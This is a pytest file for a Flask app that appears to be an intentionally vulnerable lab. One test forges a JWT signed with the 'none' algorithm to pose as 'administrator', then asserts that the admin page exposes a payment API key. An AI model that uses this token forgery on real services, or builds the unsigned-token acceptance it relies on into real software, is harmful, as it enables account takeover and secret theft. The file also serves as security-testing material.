import os
import jwt
import pytest
import json
import base64
import sys
from pathlib import Path

# Ensure we import our local app module from the build directory, not the third-party 'build' package
PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT / 'build'))
from app import create_app


@pytest.fixture()
def app():
    os.environ['SECRET_KEY'] = 'test-secret'
    os.environ['PAYMENT_API_KEY'] = 'sk_live_test_123'
    flask_app = create_app()
    flask_app.config.update({
        'TESTING': True
    })
    return flask_app


@pytest.fixture()
def client(app):
    return app.test_client()


def login_and_get_cookie(client):
    resp = client.post('/login', data={'username': 'analyst', 'password': 'analyst123'}, follow_redirects=False)
    assert resp.status_code == 302
    cookie = resp.headers.get('Set-Cookie')
    assert cookie and 'session=' in cookie
    token = cookie.split('session=')[1].split(';')[0]
    return token


def base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def make_unsigned_token(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    encoded_header = base64url(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    encoded_payload = base64url(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    return f"{encoded_header}.{encoded_payload}."


def test_login_and_access_integrations(client):
    token = login_and_get_cookie(client)
    resp = client.get('/integrations', headers={'Cookie': f'session={token}'})
    assert resp.status_code == 200
    assert b'Third-Party Integrations' in resp.data


def test_unsigned_jwt_allows_admin_access(client):
    token = login_and_get_cookie(client)
    # Decode without verifying, modify sub to administrator and re-encode unsigned
    payload = jwt.decode(token, options={'verify_signature': False})
    payload['sub'] = 'administrator'

    unsigned_token = make_unsigned_token(payload)

    # also test with both manual Cookie and cookiejar set
    client.set_cookie('session', unsigned_token)
    resp = client.get('/admin', headers={'Cookie': f'session={unsigned_token}'})
    assert resp.status_code == 200
    assert b'PAYMENT_API_KEY=' in resp.data
    assert b'sk_live_test_123' in resp.data


